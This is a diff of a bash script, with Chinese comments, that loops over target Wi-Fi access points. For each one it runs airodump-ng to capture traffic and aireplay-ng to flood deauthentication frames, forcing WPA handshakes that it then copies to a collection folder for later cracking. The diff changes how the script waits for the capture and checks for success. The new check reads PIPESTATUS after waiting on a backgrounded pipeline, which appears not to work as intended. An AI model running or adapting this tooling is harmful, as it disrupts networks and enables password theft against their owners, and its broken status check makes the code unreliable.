@@ -56,7 +56,7 @@ for ((i=0; i<${#BSSIDS[@]}; i++)); do
   # 启动 airodump-ng，并通过管道将输出传递给 grep 进行实时查找
   airodump-ng -c $CHANNEL --bssid $BSSID -w $ESSID wlan0mon | grep -m 1 "WPA handshake" &
   
-  AIRODUMP_EXIT_STATUS=$?
+  # 获取后台进程的 PID
   AIRODUMP_PID=$!
 
   # 使用 aireplay-ng 发送去认证请求以加快握手包获取
@@ -65,18 +65,22 @@ for ((i=0; i<${#BSSIDS[@]}; i++)); do
 
   AIREPLAY_PID=$(pgrep -f "aireplay-ng -0 100 -a $BSSID wlan0mon")
 
-  # 等待 airodump-ng 完成，直到找到了握手包或者进程结束
-  while ! ps -p $AIRODUMP_PID > /dev/null; do
-    sleep 2
-  done
-  
+  # 等待 airodump-ng 和 grep 执行完毕
+  wait $AIRODUMP_PID
+
   kill $AIREPLAY_PID
-  
-  if [ $AIRODUMP_EXIT_STATUS -eq 0 ]; then
-    echo "找到握手包"
+
+  # 获取管道中各命令的退出状态
+  AIRODUMP_EXIT_STATUS=${PIPESTATUS[0]}  # airodump-ng 的退出状态
+  GREP_EXIT_STATUS=${PIPESTATUS[1]}     # grep 的退出状态
+
+  # 判断是否找到了握手包
+  if [ $GREP_EXIT_STATUS -eq 0 ]; then
+    echo "找到 WPA 握手包，继续处理..."
+    # 复制握手包到指定目录
     cp -rf $ESSID-*.cap $HANDSHAKE_DIR/
   else
-    echo "airodump-ng 未成功找到握手包或发生错误"
+    echo "没有找到 WPA 握手包，或者发生了错误。"
   fi
 
 done
